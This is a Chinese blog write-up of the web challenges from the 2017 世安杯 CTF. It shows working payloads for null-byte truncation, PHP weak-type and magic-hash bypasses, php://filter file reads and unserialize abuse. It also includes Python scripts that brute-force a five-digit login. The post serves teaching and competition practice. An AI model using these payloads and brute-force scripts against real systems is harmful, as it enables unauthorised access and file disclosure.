---
title: 世安杯writeup
date: 2017-10-08 00:11:19
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---

今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下

<!-- more -->

## ctf入门级题目

```php
<?php
$flag = '*********';

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        echo '<p class="alert">You password must be alphanumeric</p>';
    else if (strpos ($_GET['password'], '--') !== FALSE)
        die($flag);
    else
        echo '<p class="alert">Invalid password</p>';
}
?>

<section class="login">
        <div class="title">
                <a href="./index.phps">View Source</a>
        </div>

        <form method="POST">
                <input type="text" required name="password" placeholder="Password" /><br/>
                <input type="submit"/>
        </form>
</section>
</body>
</html>
```

给出了源码，诶？怎么似曾相识，应该是利用`ereg`遇到`%00`截断的方法，于是提交payload

```
?password=test%00--
```



注意`%`不要被URL编码，得到flag

## 曲奇饼

一看到这个URL

```
index.php?line=&file=a2V5LnR4dA==
```



file应该是读取文件的文件名经过base64加密，解密下为key.txt，印证猜想，那就直接读取`index.php`把，加密后访问什么都没有，又注意到`line`参数，应该是行数吧？测试下的确是，于是写个脚本down下源代码

```python
#!/usr/bin/env python
# encoding: utf-8

"""

@author: iSky0t
@contact: isky0toor@gmail.com
@time: 2017/10/8 10:20
"""
import urllib2

def func():
    pass


class Main():
    for i in range(1,50):
        url = "http://ctf1.shiyanbar.com/shian-quqi/index.php?line="+str(i)+"&file=aW5kZXgucGhw"
        req = urllib2.Request(url)
        f = urllib2.urlopen(req)
        print f.read()

if __name__ == '__main__':
    pass
```



```
<?php  


$file=base64_decode(isset($_GET['file'])?$_GET['file']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&file=a2V5LnR4dA==");

$file_list = array(

'0' =>'key.txt',

'1' =>'index.php',

);

 

if(isset($_COOKIE['key']) && $_COOKIE['key']=='li_lr_480'){

$file_list[2]='thisis_flag.php';

}

 

if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?>
```

看了下源代码后在`cookie`中添加了li_lr_480，再拼接base64加密的文件名，访问得到flag

## 类型

这题卡了我好久，后来翻阅资料[array_search](https://www.bertramc.cn/2017/03/25/20.html)还去问了pcat表哥，结果表哥一步到位告诉了我方法和payload。。其本质还是函数的弱类型导致的绕过

```php
<?php 
show_source(__FILE__); 
$a=0; 
$b=0; 
$c=0; 
$d=0; 
if (isset($_GET['x1'])) 
{ 
        $x1 = $_GET['x1']; 
        $x1=="1"?die("ha?"):NULL; 
        switch ($x1) 
        { 
        case 0: 
        case 1: 
                $a=1; 
                break; 
        } 
} 
$x2=(array)json_decode(@$_GET['x2']); 
if(is_array($x2)){ 
    is_numeric(@$x2["x21"])?die("ha?"):NULL; 
    if(@$x2["x21"]){ 
        ($x2["x21"]>2017)?$b=1:NULL; 
    } 
    if(is_array(@$x2["x22"])){ 
        if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?"); 
        $p = array_search("XIPU", $x2["x22"]); 
        $p===false?die("ha?"):NULL; 
        foreach($x2["x22"] as $key=>$val){ 
            $val==="XIPU"?die("ha?"):NULL; 
        } 
        $c=1; 
} 
} 
$x3 = $_GET['x3']; 
if ($x3 != '15562') { 
    if (strstr($x3, 'XIPU')) { 
        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { 
            $d=1; 
        } 
    } 
} 
if($a && $b && $c && $d){ 
    include "flag.php"; 
    echo $flag; 
} 
?>
```



先来看看坑死我的这个函数

### array_search

手册里介绍的

```
mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )
```



两个参数必须，一个参数可选，也就是这个参数的问题。
该函数作用是在`$haystack`元素中寻找和`$needle`相同的元素，有则返回键名，无则返回`false`。

- `$strict`默认为`false`时，不严格比较类型，会自动强制转换
- `$strict`为`true`时，严格比较类型

搭配一个例子说明

```php
<?php 
$array=array(0,1);
var_dump(array_search('XIPU', $array)); 
var_dump(array_search('1XIPU', $array)); 
?>
-----------
int(0)
int(1)
```



于是这个搞定了，看下一个，pcat表哥直接给了我Python脚本，最后`$x3`主要是跑出一端md5值和15562中间那几位相等，那几位碰巧是`0e`打头，而又用的是`==`，所以

```python
__author__='pcat@chamd5.org'
from hashlib import md5
import re

def test():
    s = 'XIPU'
    myre = '0e\d{14}'
    for i in range(1000000):
        t = s + str(i)
        x = md5(t).hexdigest()[8:8 + 16]
        if re.match(myre, x) is not None:
            print t
            break

    pass


class Main():
    test()


if __name__ == '__main__':
    pass
```

最后的payload自然出来了

```
?x1=0&x2={"x21":"2018b","x22":[["XIPUx"],0]}&x3=XIPU18570
```

## 登陆

这题把我坑的更惨。虽然一点儿不难
右键查看网页源代码

```
<!-- 听说密码是一个五位数字 -->
```



当时学弟提醒我直接爆破，我看完手上那个题目后，马上写了这个脚本着手爆破，但是爆破了几个小时（不会写多线程），爆破到了4w。后来忙完其他题目，再去看会不会是注入，但是根据猜测对username做的过滤就是只有admin才行。最后狗哥说就是爆破 而且密码是000325，我的心就碎了，我是从10000爆破到99999的。哇的一声哭出来~~~
附带狗哥的脚本

```python
import requests
import re
import random
import codecs
user_agent_list = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
            "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
        ]

url = 'http://ctf1.shiyanbar.com/shian-s/'
def logfile(log, logfile):
    f = codecs.open(logfile, 'a','utf-8')
    f.write(log + "\n")
    f.close
cookies = {"PHPSESSID":"ttp2qsi06ksmf4t4h1pclk5uh1","Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3":"1507184117","Hm_cv_34d6f7353ab0915a4c582e4516dffbc3":"1*visitor*%E6%B8%B8%E5%AE%A2"}
#如果要上交wp请换成自己的cookie

passwd = [i.replace("\n", "") for i in open("m.txt", "r").readlines()]
#m.txt是我生成的00000到99999的字典，自己生成或者改名
for i in passwd:
    UA = random.choice(user_agent_list)  #随机ua
    headers = {'User-Agent': UA}  #构造成一个完整的User-Agent
    r =requests.get(url,headers=headers,cookies=cookies)
    code = re.findall(r".*?<br><br>(.*?)<br><br>",r.text)[0]
    payloadurl= "http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&password=%s&randcode=%s"%(i,code)
    #print(payloadurl)
    data = requests.get(payloadurl,headers=headers,cookies=cookies)
    data.encoding='utf-8'
    # print(data.text)
    print(i)
    data = data.text+"---------------%s"%i
    logfile(data,"data.txt")
```



我的脚本

```python
#!/usr/bin/env python
# encoding: utf-8

"""

@author: iSky0t
@contact: isky0toor@gmail.com
@time: 2017/10/8 11:28
"""

import requests
import re
def func():
    pass


class Main():
    for i in range(0,99999):
        s = requests.session()
        url = "http://ctf1.shiyanbar.com/shian-s/"
        #req = urllib2.Request(url)
        try:
            f = s.get(url).text
            num = re.findall('<br><br>(\d*)<br><br>', f)
            url = url + "?username=admin&password=" + str(i).zfill(5) + "&randcode=" + num[0]
            result = s.get(url)
            result.encoding = 'utf-8'
            if ('密码错误'.decode('utf-8')) in result.text:
                print "current num:" + str(i).zfill(5) + " --- " + "password error"
            else:
                print "current num:" + str(i).zfill(5) + "----" + result.text
                exit()
        except:
            continue
    
if __name__ == '__main__':
    pass
```



学习到了个格式化函数，以后再写字典爆破时，不会这样了

> str.zfill(width)
> Return the numeric string left filled with zeros in a string of length width. A sign prefix is handled correctly. The original string is returned if width is less than or equal to len(s).

```
n = "123"
s = n.zfill(5)
assert s == "00123"

如果是纯数字
n = 123
s = "%05d" % n
assert s == "00123"
```

## admin

这题是学弟找到的有过的原题，我忙完后也看了下，感觉挺有意思的。
直接打开显示: `you are not admin !`，查看源码

```php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```



这边`$user`的内容用PHP伪协议来达到目的，php的封装协议`php://input`可以得到原始的post数据，还有`$file`也利用`php://filter`分装协议来读取内容，

```
php://filter/convert.base64-encode/resource=index.php
```



[![admin](https://isky0t.github.io/images/shianbei01.png)](https://isky0t.github.io/images/shianbei01.png)
这边的读取结果是base64加密的，在解密后得到源代码

```php
<?php
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}

?>

<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
```



看了源代码，f1a9这个应该是flag文件，那就不能直接读取了，再读取`class.php`试试

```php
<?php

class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
        }
        return "__toString was called!";
    }
}
```



配合刚刚的源码，可以想到用 反序列的方法去读取f1a9.php了，于是本地构造下序列化字符串。

```php
<?php
    public $file;  
    public function __toString(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file);      
        }  
        return "__toString was called!";  
    }  
}  

$test = new Read();
$test->file = "php://filter/read=convert.base64-encode/resource=f1a9.php";
echo serialize($test);
?>
```



最后提交得到flag的base64的密文，解密下就行了

## 总结

今天还是有很多收获的，下面简单总结下再加深了解下，防止以后出现不会用

### php伪协议

[php:// — 访问各个输入/输出流（I/O streams）](http://php.net/manual/zh/wrappers.php.php)

#### php://input

> `php://input` 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 `php://input` 来代替 `$HTTP_RAW_POST_DATA`，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 `$HTTP_RAW_POST_DATA` 默认没有填充， 比激活 `always_populate_raw_post_data` 潜在需要更少的内存。 `enctype="multipart/form-data"` 的时候 `php://input` 是无效的。

实际使用的例子就是上面 admin 那题的 `user` 的输入内容

#### php://filter

> `php://filter` 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 `readfile()、 file()` 和 `file_get_contents()`， 在数据流内容读取之前没有机会应用其他过滤器。

[![shianbei02](https://isky0t.github.io/images/shianbei02.png)](https://isky0t.github.io/images/shianbei02.png)

```
php://filter/read=<读链需要应用的过滤器列表>
```



#### 过滤器（[内容参考](http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1)）

过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器

##### 字符串过滤器

> - string.rot13
>   进行rot13转换
> - string.toupper
>   将字符全部大写
> - string.tolower
>   将字符全部小写
> - string.strip_tags
>   去除空字符、HTML 和 PHP 标记后的结果
>   着重介绍一下这个，功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式

##### 转换过滤器

> - `convert.base64-encode & convert.base64-decode`
>   base64 编码解码
>   `convert.base64-encode和convert.base64-decode`使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 `convert.base64-encode`支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了`* line-break-chars*`，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。
> - `convert.quoted-printable-encode & convert.quoted-printable-decode`
>   quoted-printable 编码解码
>   `convert.quoted-printable-encode和 convert.quoted-printable-decode`等同于用 quoted_printable_decode()函数处理所有的流数据。没有和`* convert.quoted-printable-encode*`相对应的函数。`* convert.quoted-printable-encode*`支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，`convert.quoted-printable-encode`还支持布尔参数 binary和 force-encode-first。 `convert.base64-decode`只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。

##### 压缩过滤器

> - zlib.deflate和 zlib.inflate
>   zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。`* level*`定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。
>   Note: 因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。
> - bzip2.compress和 bzip2.decompress
>   bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：`* blocks*`是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的`* small*`单元传递。当 *small*设为`&true;` 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。

##### 加密过滤器

> `_mcrypt.*_和 _mdecrypt.*_`使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为*mcrypt.ciphername*，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：
> [![shianbei03](https://isky0t.github.io/images/shianbei03.png)](https://isky0t.github.io/images/shianbei03.png)

就拿我上面admin那题的例子 是这样使用的

```
php://filter/convert.base64-encode/resource=index.php
```